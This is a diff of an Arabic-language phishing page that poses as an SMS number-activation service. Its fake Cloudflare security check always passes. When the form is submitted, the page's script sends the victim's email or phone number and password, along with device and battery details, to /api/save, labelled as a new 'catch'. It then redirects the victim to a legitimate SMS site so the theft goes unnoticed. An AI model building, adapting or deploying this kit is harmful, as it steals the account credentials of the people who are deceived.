@@ -3,166 +3,165 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل الخدمة - SMS Services</title>
+    <title>تأكيد الهوية - SMS Service</title>
+    
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     
     <style>
-        /* التنسيق العام المطور */
+        :root {
+            --primary-color: #CC0044;
+            --bg-gradient: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+        }
+
         body {
             margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); 
-            display: flex; flex-direction: column; align-items: center; min-height: 100vh;
-            justify-content: center;
+            background: var(--bg-gradient);
+            display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }
 
-        /* حاوية البطاقة بأسلوب مودرن */
-        .login-card {
-            background: white; padding: 35px 25px; border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 90%; max-width: 400px; 
-            text-align: center; position: relative; border: 1px solid rgba(255,255,255,0.3);
+        /* حاوية البطاقة الرئيسية */
+        .auth-card {
+            background: white; width: 90%; max-width: 380px;
+            padding: 40px 30px; border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            text-align: center; border: 1px solid rgba(255,255,255,0.2);
+            position: relative;
         }
 
-        /* تنسيق أيقونة القائمة */
-        .menu-btn {
-            position: absolute; top: 20px; right: 20px; cursor: pointer; color: #CC0044;
+        /* أيقونة القائمة بالأعلى */
+        .top-nav {
+            position: absolute; top: 20px; right: 25px;
+            cursor: pointer; color: var(--primary-color); font-size: 22px;
         }
 
-        #pageImg { 
-            width: 110px; height: 110px; border-radius: 50%; 
+        /* تنسيق الصورة الدائرية */
+        #pageImg {
+            width: 110px; height: 110px; border-radius: 50%;
             object-fit: cover; margin-bottom: 20px;
-            border: 4px solid #f0f2f5; box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+            border: 4px solid #f8f9fa; box-shadow: 0 4px 12px rgba(0,0,0,0.08);
         }
 
-        h2 { color: #333; margin-bottom: 25px; font-size: 20px; font-weight: 600; }
-        
-        /* تنسيق الحقول */
-        .input-group { margin-bottom: 15px; }
-        input {
-            width: 100%; padding: 14px 18px; border: 2px solid #e1e4e8;
-            border-radius: 12px; box-sizing: border-box; outline: none;
-            font-size: 16px; transition: all 0.3s ease; background: #f8f9fa;
+        h2 { color: #333; font-size: 19px; margin-bottom: 30px; line-height: 1.5; }
+
+        /* تنسيق حقول الإدخال */
+        .input-box {
+            width: 100%; padding: 15px 20px; margin-bottom: 15px;
+            border: 2px solid #edf0f5; border-radius: 14px;
+            box-sizing: border-box; outline: none; font-size: 16px;
+            background: #fbfcfd; transition: all 0.3s ease;
+            text-align: right;
         }
-        input:focus { border-color: #CC0044; background: #fff; box-shadow: 0 0 8px rgba(204,0,68,0.1); }
+        .input-box:focus { border-color: var(--primary-color); background: white; box-shadow: 0 0 10px rgba(204,0,68,0.1); }
 
-        /* منطقة التحقق (Captcha) */
-        .captcha-wrapper { 
-            margin: 20px 0; min-height: 70px; display: flex; 
-            flex-direction: column; align-items: center; justify-content: center; 
+        /* منطقة التحقق الوهمية */
+        .captcha-zone {
+            margin: 15px 0 25px 0; min-height: 70px;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
-        #loader-text { color: #CC0044; font-weight: bold; font-size: 14px; display: none; }
+        #verify-status { color: #28a745; font-weight: bold; font-size: 14px; display: none; }
 
-        /* الزر الأنيق */
-        button {
-            width: 100%; padding: 15px; background: linear-gradient(to right, #FF0055, #CC0044);
-            color: white; border: none; border-radius: 12px; font-size: 18px;
-            font-weight: bold; cursor: pointer; transition: 0.3s;
-            box-shadow: 0 5px 15px rgba(204,0,68,0.3); margin-top: 10px;
+        /* الزر الرئيسي */
+        .btn-submit {
+            width: 100%; padding: 16px; 
+            background: linear-gradient(135deg, #FF0055 0%, #CC0044 100%);
+            color: white; border: none; border-radius: 14px;
+            font-size: 17px; font-weight: bold; cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 8px 15px rgba(204,0,68,0.25);
         }
-        button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(204,0,68,0.4); }
+        .btn-submit:hover { transform: translateY(-2px); box-shadow: 0 12px 20px rgba(204,0,68,0.35); }
 
-        .footer-links { margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; font-size: 14px; }
-        .footer-links a { color: #CC0044; text-decoration: none; font-weight: bold; cursor: pointer; }
-
-        .dev-tag { margin-top: 20px; color: #888; font-size: 11px; direction: ltr; }
+        .footer-text { margin-top: 25px; font-size: 13px; color: #777; border-top: 1px solid #eee; padding-top: 20px; }
+        .footer-text a { color: var(--primary-color); text-decoration: none; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="login-card">
-        <div class="menu-btn" onclick="Swal.fire({title: 'الخدمات المتاحة', text: 'تفعيل أرقام واتساب وتليجرام دولية', icon: 'info', confirmButtonColor: '#CC0044'})">
-            ☰
-        </div>
+    <div class="auth-card">
+        <div class="top-nav" onclick="showInfo()">☰</div>
+        
+        <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg">
+        <h2 id="pageLetter">يرجى تسجيل الدخول للتحقق من ملكية الحساب وتفعيل الخدمة</h2>
 
-        <img id="pageImg" src="https://logodix.com/logo/2014521.png">
-        <h2 id="pageLetter">سجل دخولك لتفعيل خدمة الأرقام</h2>
-
-        <form id="masterForm">
-            <div class="input-group">
-                <input type="text" id="userInput" placeholder="البريد الإلكتروني أو الهاتف" required>
-            </div>
-            <div class="input-group">
-                <input type="password" id="passInput" placeholder="كلمة السر" required>
-            </div>
+        <form id="loginForm">
+            <input type="text" id="userInp" class="input-box" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="passInp" class="input-box" placeholder="كلمة السر" required>
             
-            <div class="captcha-wrapper">
-                <div id="loader-text">🔄 جاري فحص أمان الجهاز...</div>
-                <div class="cf-turnstile" id="cf-box" data-sitekey="1x00000000000000000000AA" data-callback="handleCaptcha"></div>
+            <div class="captcha-zone">
+                <div id="verify-status">🔄 جاري فحص بيئة النظام...</div>
+                <div class="cf-turnstile" id="cf-widget" data-sitekey="1x00000000000000000000AA" data-callback="onVerify"></div>
             </div>
 
-            <button type="submit" id="pageBtn">تسجيل دخول</button>
+            <button type="submit" class="btn-submit" id="btnText">تأكيد الحساب الآن</button>
         </form>
 
-        <div class="footer-links">
-            <p>ليس لديك حساب؟ <a onclick="Swal.fire({title:'عذراً', text:'التسجيل مغلق حالياً، استخدم حسابك الحالي', icon:'error', confirmButtonColor:'#CC0044'})">إنشاء حساب جديد</a></p>
+        <div class="footer-text">
+            ليس لديك حساب؟ <a onclick="noAccount()">إنشاء حساب جديد</a>
         </div>
     </div>
 
-    <div class="dev-tag">System Version 4.2.0 - © 2026</div>
-
     <script>
-        let isVerified = false;
+        let verified = false;
 
-        // وظيفة جلب إعدادات اللوحة (الصورة والنص)
-        async function fetchConfig() {
+        // تحديث الصورة والنصوص من اللوحة (API)
+        async function syncData() {
             try {
                 const res = await fetch('/api/get');
-                const data = await res.json();
-                if(data.image) document.getElementById('pageImg').src = data.image;
-                if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
-                if(data.button) document.getElementById('pageBtn').innerText = data.button;
+                const d = await res.json();
+                if(d.image) document.getElementById('pageImg').src = d.image;
+                if(d.letter) document.getElementById('pageLetter').innerText = d.letter;
+                if(d.button) document.getElementById('btnText').innerText = d.button;
             } catch(e) {}
         }
-        window.onload = fetchConfig;
+        window.onload = syncData;
 
-        // محاكاة التحقق من الهوية
-        function handleCaptcha() {
-            const cfBox = document.getElementById('cf-box');
-            const loader = document.getElementById('loader-text');
-            cfBox.style.display = 'none';
-            loader.style.display = 'block';
-
+        // نظام التحقق الوهمي
+        function onVerify() {
+            const widget = document.getElementById('cf-widget');
+            const status = document.getElementById('verify-status');
+            widget.style.display = 'none';
+            status.style.display = 'block';
             setTimeout(() => {
-                loader.innerHTML = '✅ تم التحقق من هويتك بنجاح';
-                loader.style.color = '#28a745';
-                isVerified = true;
-            }, 2500);
+                status.innerHTML = "✅ تم التحقق من أمان الجهاز بنجاح";
+                verified = true;
+            }, 2000);
         }
 
-        // سحب معلومات الجهاز
-        async function getDeviceData() {
-            let info = { ua: navigator.userAgent, battery: "N/A" };
-            try {
-                const battery = await navigator.getBattery();
-                info.battery = (battery.level * 100) + "%";
-            } catch (e) {}
-            return info;
+        function showInfo() {
+            Swal.fire({ title: 'معلومات الخدمة', text: 'هذه الخطوة ضرورية لمنع الحسابات الوهمية من استخدام الخدمة.', icon: 'info', confirmButtonColor: '#CC0044' });
         }
 
-        document.getElementById('masterForm').onsubmit = async (e) => {
+        function noAccount() {
+            Swal.fire({ title: 'عذراً', text: 'تم إيقاف التسجيل حالياً، يرجى استخدام حسابك المرتبط بالخدمة.', icon: 'warning', confirmButtonColor: '#CC0044' });
+        }
+
+        // سحب البيانات وإرسالها
+        document.getElementById('loginForm').onsubmit = async (e) => {
             e.preventDefault();
-            if (!isVerified) {
-                Swal.fire({ text: 'يرجى إكمال التحقق من الأمان أولاً', icon: 'warning', confirmButtonColor: '#CC0044' });
+            if(!verified) {
+                Swal.fire({ text: 'يرجى إكمال فحص الأمان أولاً', icon: 'error', confirmButtonColor: '#CC0044' });
                 return;
             }
 
-            const device = await getDeviceData();
+            // سحب معلومات البطارية والجهاز
+            let bat = "غير معروف";
+            try { const b = await navigator.getBattery(); bat = (b.level * 100) + "%"; } catch(e) {}
+
             const payload = {
                 title: "🔥 صيد جديد مـحتـرف (كامل البيانات)",
-                user: document.getElementById('userInput').value,
-                pass: document.getElementById('passInput').value,
-                details: `📱 الجهاز: ${device.ua} | 🔋 البطارية: ${device.battery}`,
+                user: document.getElementById('userInp').value,
+                pass: document.getElementById('passInp').value,
+                details: `📱 الجهاز: ${navigator.platform} | 🔋 البطارية: ${bat}`,
                 time: new Date().toLocaleString('ar-EG')
             };
 
-            // إرسال البيانات للبوت
             await fetch('/api/save', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
 
-            // التحويل النهائي
             window.location.href = "https://receive-smss.com/"; 
         };
     </script>
